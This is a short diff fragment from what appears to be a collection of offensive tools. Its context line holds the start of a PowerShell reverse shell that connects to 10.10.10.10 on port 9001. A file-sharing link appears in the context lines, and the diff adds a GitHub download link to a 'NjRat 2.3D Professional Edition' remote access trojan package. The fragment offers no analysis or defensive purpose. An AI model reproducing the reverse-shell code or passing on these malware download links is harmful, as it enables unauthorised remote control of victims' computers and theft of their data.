@@ -6,3 +6,5 @@ $LHOST = "10.10.10.10"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPCl
 
 
 https://mega.nz/file/g6MhzRbQ#TOKndyfmToiVLcqcyN2VYRNniA463nEWzkJhXLb4e54
+
+https://github.com/SebDevAO/NjRat-2.3D-Rat/releases/download/2.3.fix/NjRat.2.3D.Professional.Edition.zip
